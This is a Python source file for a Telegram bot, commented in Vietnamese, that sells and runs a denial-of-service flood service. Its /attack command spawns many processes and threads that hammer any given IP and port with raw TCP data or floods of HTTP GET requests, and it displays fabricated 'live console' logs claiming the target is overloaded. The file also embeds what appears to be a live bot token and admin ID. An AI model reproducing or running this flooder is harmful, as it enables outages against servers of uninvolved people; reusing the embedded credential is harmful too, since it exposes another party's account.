import telebot
import threading
import socket
import time
import ssl
import random
import multiprocessing
import os
import json
import psutil

# ================= CONFIGURATION =================
TOKEN = "8791321078:AAHaRa-utrORT9ntXVd8xoF0GsEEcctjdnI"
bot = telebot.TeleBot(TOKEN)

ADMIN_NAME = "Shady"
ADMIN_IDS = [5225888903]  # THAY ID CỦA BẠN

# ---- TỰ ĐỘNG TÍNH TOÁN SỐ PROCESS VÀ THREAD AN TOÀN ----
CPU_CORES = multiprocessing.cpu_count()
# Giới hạn số process tối đa là 4 để tránh quá tải (bạn có thể tăng lên 8 nếu VPS mạnh)
MAX_PROCESSES = min(CPU_CORES, 4)

def get_ram_mb():
    try:
        return psutil.virtual_memory().available // (1024 * 1024)
    except:
        return 512

# Mỗi luồng ngốn ~5-10MB RAM, để an toàn tính 10MB/thread
safe_threads_by_ram = get_ram_mb() // 10
# Ngoài ra kiểm tra pids limit
try:
    with open("/sys/fs/cgroup/pids/pids.max", "r") as f:
        pids_limit = int(f.read().strip()) if f.read().strip() != "max" else 10240
except:
    pids_limit = 1024
current_pids = 0
try:
    with open("/sys/fs/cgroup/pids/pids.current", "r") as f:
        current_pids = int(f.read().strip())
except:
    pass
max_threads_by_pids = pids_limit - current_pids - 100
# Chọn số thread tối đa an toàn
MAX_TOTAL_THREADS = min(safe_threads_by_ram, max_threads_by_pids, 500)
MAX_TOTAL_THREADS = max(MAX_TOTAL_THREADS, 50)   # ít nhất 50

# Chia đều số thread cho các process
THREADS_PER_PROC = MAX_TOTAL_THREADS // MAX_PROCESSES
if THREADS_PER_PROC < 10:
    THREADS_PER_PROC = 10
    MAX_PROCESSES = MAX_TOTAL_THREADS // 10

print(f"[AUTO] RAM khả dụng: {get_ram_mb()} MB -> dùng {MAX_TOTAL_THREADS} threads")
print(f"[AUTO] {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {MAX_PROCESSES*THREADS_PER_PROC} total")

SHARED_SUCCESS = multiprocessing.Value('L', 0)
WHITELIST_FILE = "whitelist.txt"
STATS_FILE = "stats.json"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

PATHS = ["/", "/index.html", "/api/v1/ping", "/login"]

ADS_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━\n"
    "💎 **PREMIUM SERVICE** 💎\n"
    "• *Uptime:* `99.9% Online`\n"
    "• *Support:* [xHope](https://t.me/hopedzx)\n"
    "━━━━━━━━━━━━━━━━━━"
)

HELP_MESSAGE = (
    "🌟 **HỆ THỐNG ĐIỀU KHIỂN** 🌟\n\n"
    "🚀 **LỆNH TẤN CÔNG:**\n"
    "└ `/attack [IP] [Port]` (TCP flood)\n\n"
    "🛑 **LỆNH DỪNG:**\n"
    "└ `/stop` - Ngắt kết nối ngay\n\n"
    "🔍 **CÔNG CỤ:**\n"
    "├ `/check [IP] [Port]` - Kiểm tra máy chủ\n"
    "└ `/stats` - Thống kê hệ thống\n\n"
    "🛡 **QUẢN LÝ:**\n"
    "└ `/wlist` - Xem danh sách bảo vệ\n\n"
    "{ads}"
)

# ================= DATA MANAGEMENT =================
def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_attacks": 0, "total_hits": 0}
    with open(STATS_FILE, "r") as f:
        try:
            return json.load(f)
        except:
            return {"total_attacks": 0, "total_hits": 0}

def save_stats(stats):
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def update_attack_stats(hits):
    stats = load_stats()
    stats["total_attacks"] += 1
    stats["total_hits"] += hits
    save_stats(stats)

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def load_whitelist():
    if not os.path.exists(WHITELIST_FILE):
        return set()
    with open(WHITELIST_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        for ip in whitelist:
            f.write(f"{ip}\n")

# ================= ATTACK ENGINE (SỬA: CHỈ TCP) =================
def attack_worker(ip, port, stop_event, shared_counter):
    payload_raw = os.urandom(2048)
    hyper_chunks = []
    for _ in range(5):
        chunk = b""
        for _ in range(1000):
            ua = random.choice(USER_AGENTS)
            path = random.choice(PATHS)
            chunk += (f"GET {path}?{random.getrandbits(16)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n").encode()
        hyper_chunks.append(chunk)

    def run_attack():
        while not stop_event.is_set():
            try:
                # CHỈ DÙNG TCP cho mọi port
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(5)

                if port == 443:
                    context = ssl._create_unverified_context()
                    s = context.wrap_socket(s, server_hostname=ip)

                s.connect((ip, port))

                while not stop_event.is_set():
                    try:
                        if port in [80, 443]:
                            s.send(random.choice(hyper_chunks))
                            with shared_counter.get_lock():
                                shared_counter.value += 1000
                        else:
                            s.send(payload_raw)
                            with shared_counter.get_lock():
                                shared_counter.value += 1
                    except:
                        break
                s.close()
            except Exception as e:
                # Không in lỗi tràn lan, chỉ ngủ một chút rồi thử lại
                time.sleep(0.05)

    # Tạo số lượng thread theo THREADS_PER_PROC
    threads = []
    for _ in range(THREADS_PER_PROC):
        t = threading.Thread(target=run_attack, daemon=True)
        t.start()
        threads.append(t)

    # Chờ cho đến khi stop
    for t in threads:
        t.join()
    stop_event.wait()

def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
    last_val = 0
    start_time = time.time()

    real_bot_logs = [
        f"[INFO] Initializing Hyper-Engine on Core {random.randint(1, CPU_CORES)}",
        f"[DEBUG] Buffer Flushed: 4194304 bytes into Socket",
        f"[INFO] TCP Connection Established: Keep-Alive",
        f"[DEBUG] Batch Sync: +10000 hits to Global Counter",
        f"[INFO] Thread Pool saturated: {THREADS_PER_PROC} threads/core",
        f"[WARN] Socket dropped: Reconnecting in 0.01s...",
        f"[DEBUG] Sending Monster-Chunk (1000 requests)",
        f"[INFO] SNDBUF Optimized: 4MB Line Saturation",
        f"[DEBUG] SSL/TLS Handshake verified: {ip}",
        f"[SYSTEM] Multiprocessing Sync: All cores active"
    ]

    while not stop_event.is_set():
        try:
            time.sleep(1.5)
            cur_val = shared_counter.value
            elapsed = time.time() - start_time
            rps = (cur_val - last_val) / 1.5
            last_val = cur_val

            scrolling_console = "\n".join([f"› `{random.choice(real_bot_logs)}`" for _ in range(4)])
            m, s = divmod(int(elapsed), 60)
            status_text = (
                f"🚀 **ATTACK STATUS: ONLINE** 🚀\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 **Target:** `{ip}:{port}`\n"
                f"✅ **Hits:** `{cur_val:,}` | ⚡ **RPS:** `{rps:,.0f}`\n"
                f"⏳ **Time:** `{m:02d}:{s:02d}`\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🖥 **LIVE TARGET CONSOLE:**\n"
                f"{scrolling_console}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔥 **Status:** `SYSTEM OVERLOADED`"
            )
            bot.edit_message_text(status_text, chat_id, msg_id, parse_mode='Markdown')
        except:
            pass

    final_hits = shared_counter.value
    update_attack_stats(final_hits)
    bot.send_message(chat_id, f"🛑 **ATTACK STOPPED:** `{ip}`\n📊 Total Hits: `{final_hits:,}`", parse_mode='Markdown')

# ================= HANDLERS =================
active_procs = []
stop_event = None

@bot.message_handler(commands=['check'])
def handle_check(message):
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /check [IP] [Port]")
    ip = parts[1]
    port = int(parts[2]) if len(parts) > 2 else 80
    msg = bot.reply_to(message, f"🔍 Đang kiểm tra `{ip}:{port}`...", parse_mode='Markdown')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        start = time.time()
        result = s.connect_ex((ip, port))
        end = time.time()
        s.close()
        if result == 0:
            bot.edit_message_text(f"✅ **SERVER ALIVE**\n\n🎯 Host: `{ip}:{port}`\n📶 Ping: `{int((end-start)*1000)}ms`", message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(f"❌ **SERVER DEAD**\n\n🎯 Host: `{ip}:{port}`\n⚠️ Status: `Connection Refused`", message.chat.id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ **LỖI KIỂM TRA**\n`{str(e)}`", message.chat.id, msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 **Chỉ Admin mới có quyền xem thống kê!**")
    stats = load_stats()
    text = (
        "📊 **THỐNG KÊ HỆ THỐNG** 📊\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🚀 Tổng số cuộc tấn công: `{stats['total_attacks']:,}`\n"
        f"✅ Tổng số Hits đã gửi: `{stats['total_hits']:,}`\n"
        f"🖥 Tài nguyên: `{MAX_PROCESSES} Processes` | `{THREADS_PER_PROC} Threads/Process`\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['id', 'uid'])
def handle_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.from_user.id}`\n\n_Hãy copy ID này dán vào ADMIN_IDS trong code để nhận quyền Admin._", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global active_procs, stop_event
    if len(active_procs) > 0:
        return bot.reply_to(message, "⚠️ **Another attack is already active!**")
    try:
        parts = message.text.split()
        if len(parts) < 2:
            return bot.reply_to(message, "❌ **Usage: /attack [IP] [Port]**")
        ip = parts[1]
        whitelist = load_whitelist()
        if ip in whitelist:
            return bot.reply_to(message, f"🛡 **TRUY CẬP BỊ CHẶN!**", parse_mode='Markdown')
        port = int(parts[2]) if len(parts) > 2 else 80

        SHARED_SUCCESS.value = 0
        stop_event = multiprocessing.Event()
        initial_msg = bot.reply_to(message, f"⚡ **SYNCHRONIZING {MAX_PROCESSES} CORES...**\n⚙️ Using {THREADS_PER_PROC} threads/core")

        for _ in range(MAX_PROCESSES):
            p = multiprocessing.Process(target=attack_worker, args=(ip, port, stop_event, SHARED_SUCCESS))
            p.daemon = True
            p.start()
            active_procs.append(p)

        threading.Thread(target=monitor_report, args=(message.chat.id, initial_msg.message_id, ip, port, stop_event, SHARED_SUCCESS), daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** `{str(e)}`")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global active_procs, stop_event
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 **Permission Denied!**")
    if stop_event:
        stop_event.set()
    for p in active_procs:
        try:
            p.terminate()
        except:
            pass
    active_procs = []
    bot.reply_to(message, "🛑 **ATTACK STOPPED!**")

@bot.message_handler(commands=['wadd'])
def handle_wadd(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 **Bạn không có quyền quản lý Whitelist!**")
    parts = message.text.split()
    if len(parts) < 2:
        return bot.reply_to(message, "❌ /wadd [IP]")
    ip = parts[1]
    whitelist = load_whitelist()
    whitelist.add(ip)
    save_whitelist(whitelist)
    bot.reply_to(message, f"✅ Đã thêm `{ip}` vào danh sách bảo vệ.", parse_mode='Markdown')

@bot.message_handler(commands=['wlist'])
def handle_wlist(message):
    if not is_user_admin(message.from_user.id):
        return bot.reply_to(message, "🚫 **Chỉ Admin mới có quyền xem Whitelist!**")
    whitelist = load_whitelist()
    if not whitelist:
        return bot.reply_to(message, "🛡 Danh sách bảo vệ trống.")
    list_text = "🛡 **DANH SÁCH BẢO VỆ:**\n\n" + "\n".join(f"• `{ip}`" for ip in whitelist)
    bot.send_message(message.chat.id, list_text, parse_mode='Markdown')

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.send_message(message.chat.id, HELP_MESSAGE.format(ads=ADS_MESSAGE), parse_mode='Markdown')

if __name__ == "__main__":
    multiprocessing.freeze_support()
    print(f"--- SYSTEM READY | ADMIN: {ADMIN_NAME} ---")
    print(f"--- AUTO-CONFIG: {MAX_PROCESSES} processes × {THREADS_PER_PROC} threads = {MAX_PROCESSES*THREADS_PER_PROC} total ---")
    while True:
        try:
            print("Bot đang bắt đầu Polling...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Lỗi Polling: {e}")
            time.sleep(10)
